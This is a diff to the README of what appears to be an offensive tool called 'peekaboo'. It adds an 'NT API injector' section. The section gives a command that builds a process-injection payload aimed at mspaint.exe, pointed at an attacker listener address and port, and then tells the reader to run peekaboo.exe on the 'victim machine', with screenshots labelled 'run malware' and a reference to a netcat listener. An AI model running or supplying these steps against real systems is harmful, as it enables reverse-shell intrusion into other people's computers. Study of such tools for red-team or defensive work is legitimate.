@@ -95,6 +95,21 @@ check your netcat listener:
 
 ![check netcat listener](./screenshots/13.png?raw=true)
 
+## 4. NT API injector
+run python script on linux (for example process `mspaint.exe`):
+```bash
+python3 peekaboo_nt.py -l 192.168.57.100 -p 4445 -e mspaint.exe -m console
+```
+
+![enc and compile nt](./screenshots/15.png?raw=true)
+
+### then on victim machine (windows 10 x64):
+```cmd
+.\peekaboo.exe
+```
+
+![run malware](./screenshots/14.png?raw=true)
+
 ## Issues.
 Tested on:
 1. Attacker machines: Kali linux 2020.1, Windows 10 x64
